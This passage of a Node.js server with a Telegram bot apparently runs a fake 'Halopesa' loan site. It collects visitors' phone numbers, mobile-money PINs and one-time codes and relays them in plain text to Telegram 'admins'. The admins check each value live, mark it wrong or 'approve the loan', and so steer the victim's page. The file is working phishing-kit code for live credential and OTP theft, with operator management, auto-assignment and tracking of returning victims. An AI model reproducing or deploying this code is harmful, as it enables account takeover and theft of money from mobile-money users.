            const requestText   = input.substring(spaceIndex + 1).trim();

            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (!adminChatIds.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`);

            const requestId = `REQ-${Date.now()}`;

            const sent = await bot.sendMessage(adminChatIds.get(targetAdminId), `
❓ *REQUEST FROM SUPER ADMIN*

${requestText}

---
📋 Request ID: \`${requestId}\`
⏰ ${new Date().toLocaleString()}
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Done',      callback_data: `request_done_${requestId}_${targetAdminId}` },
                        { text: '❓ Need Help', callback_data: `request_help_${requestId}_${targetAdminId}` }
                    ]]
                }
            });

            if (sent) {
                bot.sendMessage(chatId, `✅ Request sent to ${targetAdmin.name}.\nRequest ID: \`${requestId}\``, { parse_mode: 'Markdown' });
            } else {
                bot.sendMessage(chatId, `❌ Failed to send request.`);
            }
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    console.log('✅ Command handlers setup complete!');
}

// ==========================================
// TELEGRAM CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    console.log(`\n🔘 CALLBACK: ${data} | admin: ${adminId || 'UNAUTHORIZED'}`);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
    }

    // ==========================================
    // NEW: suspendall checklist callbacks
    // ==========================================

    if (data === 'sall_noop') {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
    }

    if (data.startsWith('sall_toggle_')) {
        if (adminId !== 'ADMIN001') {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        const targetAdminId = data.replace('sall_toggle_', '');
        const session = suspendAllSessions.get(chatId);

        if (!session) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
        }

        if (session.selections.has(targetAdminId)) {
            session.selections.delete(targetAdminId);
        } else {
            session.selections.add(targetAdminId);
        }

        const { text, inline_keyboard } = buildSuspendAllPage(session);

        try {
            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard }
            });
        } catch (e) {
            // Ignore no-change errors from Telegram
        }

        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
    }

    if (data.startsWith('sall_page_')) {
        if (adminId !== 'ADMIN001') {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        const pageNum = parseInt(data.replace('sall_page_', ''));
        const session = suspendAllSessions.get(chatId);

        if (!session) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
        }

        session.page = pageNum;
        const { text, inline_keyboard } = buildSuspendAllPage(session);

        try {
            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard }
            });
        } catch (e) {
            // Ignore no-change errors
        }

        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
    }

    if (data === 'sall_cancel') {
        if (adminId !== 'ADMIN001') {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        suspendAllSessions.delete(chatId);

        await bot.editMessageText(`
❌ *SUSPEND ALL — CANCELLED*

No changes were made.
⏰ ${new Date().toLocaleString()}
        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Cancelled' });
    }

    if (data === 'sall_confirm') {
        if (adminId !== 'ADMIN001') {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        const session = suspendAllSessions.get(chatId);

        if (!session) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
        }

        const toSuspend = session.allAdmins.filter(a => session.selections.has(a.adminId));

        if (toSuspend.length === 0) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ No admins selected to suspend!', show_alert: true });
        }

        // Answer and update message immediately so buttons disappear
        await bot.answerCallbackQuery(callbackQuery.id, { text: `🔒 Suspending ${toSuspend.length} admin(s)...` });

        await bot.editMessageText(`
⏳ *SUSPENDING ${toSuspend.length} LINK(S)...*

Please wait while selected admin links are being locked.
        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        const keptCount  = session.allAdmins.length - toSuspend.length;
        const sessionCopy = { allAdmins: session.allAdmins }; // keep for summary
        suspendAllSessions.delete(chatId);

        // Execute in background
        (async () => {
            let successCount = 0;
            let notifyCount  = 0;
            let errorCount   = 0;

            for (const admin of toSuspend) {
                try {
                    // Pause the admin
                    pausedAdmins.add(admin.adminId);
                    await db.updateAdmin(admin.adminId, {
                        status: 'paused'
                    });

                    successCount++;

                    if (admin.chatId) {
                        bot.sendMessage(admin.chatId, `
🔒 *YOUR LINK HAS BEEN SUSPENDED*

Your admin link has been suspended by the super admin.

You will not be able to process new applications until your access is restored.

📧 Contact the super admin if you have questions.
                        `.trim(), { parse_mode: 'Markdown' })
                        .then(() => notifyCount++)
                        .catch(() => {});
                    }

                    await new Promise(resolve => setTimeout(resolve, 150));

                } catch (err) {
                    console.error(`Failed to suspend ${admin.adminId}:`, err.message);
                    errorCount++;
                }
            }

            await bot.editMessageText(`
🔒 *SUSPENSION COMPLETE*

✅ Links suspended: ${successCount}
📨 Notifications sent: ${notifyCount}
🟢 Kept active: ${keptCount}
❌ Errors: ${errorCount}
👥 Total admins: ${sessionCopy.allAdmins.length}
⏰ ${new Date().toLocaleString()}

Use /unpauseadmin ADMINID to restore access to any admin.
            `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        })();

        return;
    }

    if (!isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
    }

    // ── Request responses (Done / Need Help) ──
    if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
        const parts             = data.split('_');
        const action            = parts[1];
        const requestId         = parts[2];
        const respondingAdminId = parts[3];
        const respondingAdmin   = await db.getAdmin(respondingAdminId);
        const superAdminChatId  = adminChatIds.get('ADMIN001');

        if (superAdminChatId) {
            if (action === 'done') {
                await bot.sendMessage(superAdminChatId, `
✅ *REQUEST COMPLETED*

Admin: ${respondingAdmin?.name || respondingAdminId}
Request ID: \`${requestId}\`
⏰ ${new Date().toLocaleString()}
                `, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(superAdminChatId, `
❓ *ADMIN NEEDS HELP*

Admin: ${respondingAdmin?.name || respondingAdminId}
📧 ${respondingAdmin?.email || 'N/A'}
🆔 \`${respondingAdminId}\`
Request ID: \`${requestId}\`

Use: /send ${respondingAdminId} Your message
                `, { parse_mode: 'Markdown' });
            }
        }

        const responseEmoji = action === 'done' ? '✅' : '❓';
        const responseText  = action === 'done' ? 'Task Completed' : 'Requested Help';

        await bot.editMessageText(`
${responseEmoji} *REQUEST ${responseText.toUpperCase()}*

Request ID: \`${requestId}\`
⏰ ${new Date().toLocaleString()}

Super admin has been notified.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: `${responseEmoji} Response sent to super admin` });
        return;
    }

    // ── Parse: action_type_ADMINID_applicationId ──
    const parts = data.split('_');
    if (parts.length < 4) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true });
    }

    const action          = parts[0];
    const type            = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    // Ownership check
    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
    }

    // Wrong PIN at OTP stage
    if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`
❌ *WRONG PIN AT OTP STAGE*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${application.otp}\`

⚠️ User's PIN was incorrect
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will re-enter PIN.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter PIN' });
        return;
    }

    // Wrong code
    if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`
❌ *WRONG CODE*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${application.otp}\`

⚠️ Wrong verification code
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will re-enter code.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code' });
        return;
    }

    // Deny PIN
    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`
❌ *INVALID - REJECTED*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 \`${application.pin}\`

✗ REJECTED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected' });
    }

    // Allow OTP
    else if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`
✅ *ALL CORRECT - APPROVED*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 \`${application.pin}\`

✓ APPROVED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will now proceed to OTP.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.' });
    }

    // Approve Loan
    else if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`
🎉 *LOAN APPROVED!*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 \`${application.pin}\`
🔢 \`${application.otp}\`

✓ FULLY APPROVED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

✅ User will see approval page!
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
    }
});

console.log('✅ Telegram callback handler registered!');

// ==========================================
// DB-READY MIDDLEWARE
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ success: false, message: 'Database not ready yet' });
    }
    next();
});

// ==========================================
// API ENDPOINTS
// ==========================================

// POST /api/verify-pin
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2,7).toUpperCase()}`;

        console.log('📥 PIN Verification Request:', { phoneNumber, requestAdminId, assignmentType });

        // Race condition guard
        const lockKey = `pin_${phoneNumber}`;
        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
        }
        processingLocks.add(lockKey);
        setTimeout(() => processingLocks.delete(lockKey), 10000);

        let assignedAdmin;

        if (assignmentType === 'specific' && requestAdminId) {
            // ── HARD LOCK: customer came via a specific admin link ──
            assignedAdmin = await db.getAdmin(requestAdminId);

            if (!assignedAdmin) {
                processingLocks.delete(lockKey);
                console.error(`❌ Specific admin not found: ${requestAdminId}`);
                return res.status(400).json({ success: false, message: 'The link you used is invalid. Please contact support.' });
            }
            if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                processingLocks.delete(lockKey);
                console.warn(`⚠️ Specific admin paused/inactive: ${requestAdminId}`);
                return res.status(400).json({ success: false, message: 'This service link is temporarily unavailable. Please try again later or contact support.' });
            }

            console.log(`🔒 LOCKED to specific admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);

        } else {
            // ── AUTO-ASSIGN: no admin link used ──
            const activeAdmins     = await db.getActiveAdmins();
            const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
            if (availableAdmins.length === 0) {
                processingLocks.delete(lockKey);
                return res.status(503).json({ success: false, message: 'No admins available. Please try again later.' });
            }
            const adminStats = await Promise.all(
                availableAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: stats.pinPending + stats.otpPending };
                })
            );
            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
            console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
        }

        // Duplicate check — only within this admin's pending apps
        const existingApps    = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const alreadyPending  = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
        if (alreadyPending) {
            processingLocks.delete(lockKey);
            return res.json({
                success: true,
                applicationId: alreadyPending.id,
                assignedTo: assignedAdmin.name,
                assignedAdminId: assignedAdmin.adminId
            });
        }

        // Returning user check (scoped to this admin only)
        const thisAdminPastApps = existingApps
            .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const isReturningUser = thisAdminPastApps.length > 0;

        let historyText = '';
        if (isReturningUser) {
            const last       = thisAdminPastApps[0];
            const lastDate   = new Date(last.timestamp).toLocaleString();
            const lastStatus = last.otpStatus === 'approved'      ? '✅ Approved' :
                               last.pinStatus === 'rejected'      ? '❌ Rejected (PIN)' :
                               last.otpStatus === 'wrongcode'     ? '❌ Wrong OTP Code' :
                               last.otpStatus === 'wrongpin_otp'  ? '❌ Wrong PIN (OTP stage)' : '⏳ Incomplete';
            const allStatuses = thisAdminPastApps.slice(0, 3).map((a, idx) => {
                const s = a.otpStatus === 'approved'     ? '✅' :
                          a.pinStatus === 'rejected'     ? '❌PIN' :
                          a.otpStatus === 'wrongcode'    ? '❌OTP' :
                          a.otpStatus === 'wrongpin_otp' ? '❌PIN@OTP' : '⏳';
                return `${idx+1}. ${s} ${new Date(a.timestamp).toLocaleDateString()}`;
            }).join('\n');
            historyText = `\n\n━━━━━━━━━━━━━━━━━━\n🔄 *RETURNING CUSTOMER*\nVisits to you: *${thisAdminPastApps.length}*\nLast visit: ${lastDate}\nLast result: ${lastStatus}\nRecent history:\n${allStatuses}\n━━━━━━━━━━━━━━━━━━`;
        }

        // Ensure admin is in active map
        if (!adminChatIds.has(assignedAdmin.adminId)) {
            if (assignedAdmin.chatId) {
                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
            } else {
                processingLocks.delete(lockKey);
                return res.status(503).json({ success: false, message: 'Admin not connected — they need to /start the bot first' });
            }
        }

        // Save application
        await db.saveApplication({
            id:             applicationId,
            adminId:        assignedAdmin.adminId,
            adminName:      assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus:      'pending',
            otpStatus:      'pending',
            assignmentType: assignmentType || 'auto',
            isReturningUser,
            previousCount:  thisAdminPastApps.length,
            timestamp:      new Date().toISOString()
        });

        console.log(`💾 Application saved: ${applicationId}`);

        // Send to Telegram
        const userLabel = isReturningUser
            ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
            : '🆕 *NEW APPLICATION*';
        await sendToAdmin(assignedAdmin.adminId, `
${userLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(phoneNumber)}\`
🔑 \`${pin}\`
⏰ ${new Date().toLocaleString()}${historyText}

⚠️ *VERIFY INFORMATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny',     callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        processingLocks.delete(lockKey);
        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

    } catch (error) {
        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-pin-status/:applicationId
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-otp
app.post('/api/verify-otp', async (req, res) => {
    console.log('\n🔵 /api/verify-otp called:', JSON.stringify(req.body));
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        // Re-add admin to map if needed
        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) {
                adminChatIds.set(application.adminId, admin.chatId);
            } else {
                return res.status(500).json({ success: false, message: 'Admin unavailable' });
            }
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
        console.log(`✅ OTP saved for ${applicationId}: ${otp}`);

        const returningLabel = application.isReturningUser
            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
            : '';
        await sendToAdmin(application.adminId, `
📲 *CODE VERIFICATION*${returningLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${otp}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY CODE*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/resend-otp
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });

        await sendToAdmin(application.adminId, `
🔄 *OTP RESEND REQUEST*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`

User requested a new OTP.
        `, { parse_mode: 'Markdown' });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/admins
app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const adminList = admins
            .filter(a => !pausedAdmins.has(a.adminId))
            .map(a => ({ id: a.adminId, name: a.name, email: a.email, status: a.status, connected: adminChatIds.has(a.adminId) }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/validate-admin/:adminId
app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const admin = await db.getAdmin(req.params.adminId);
        if (admin && pausedAdmins.has(admin.adminId)) {
            return res.json({ success: true, valid: false, message: 'Admin is currently paused' });
        }
        if (admin && admin.status === 'active') {
            res.json({ success: true, valid: true, connected: adminChatIds.has(admin.adminId), admin: { id: admin.adminId, name: admin.name, email: admin.email } });
        } else {
            res.json({ success: true, valid: false, message: 'Admin not found or inactive' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status:        'ok',
        database:      dbReady ? 'connected' : 'not ready',
        activeAdmins:  adminChatIds.size,
        pausedAdmins:  pausedAdmins.size,
        adminsInMap:   Array.from(adminChatIds.entries()).map(([id, chatId]) => ({ id, chatId, paused: pausedAdmins.has(id) })),
        botMode:       'webhook',
        webhookUrl:    `${WEBHOOK_URL}/telegram-webhook`,
        timestamp:     new Date().toISOString()
    });
});

// ── Serve the Halopesa HTML ──
app.get('/', async (req, res) => {
    const adminId = req.query.admin;

    if (adminId) {
        console.log(`🔗 Admin link accessed: ${adminId}`);
        try {
            const admin = await db.getAdmin(adminId);
            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                    console.log(`➕ Added to active map: ${adminId} -> ${admin.chatId}`);
                }
            }
        } catch (error) {
            console.error('Error validating admin on landing page:', error);
        }
    }

    res.sendFile(path.join(__dirname, 'halopesa-integrated.html'));
});

// ==========================================
// START SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n💎 HALOPESA LOAN PLATFORM`);
    console.log(`==========================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`👥 Admins: ${adminChatIds.size} connected`);
    console.log(`\n✅ Ready!\n`);
});

// ==========================================
// GRACEFUL SHUTDOWN
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}, shutting down...`);
    try {
        suspendAllSessions.clear();
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Cleanup complete');
        process.exit(0);
    } catch (error) {
        console.error('❌ Shutdown error:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT',  () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection:', error?.message);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception:', error?.message);
});
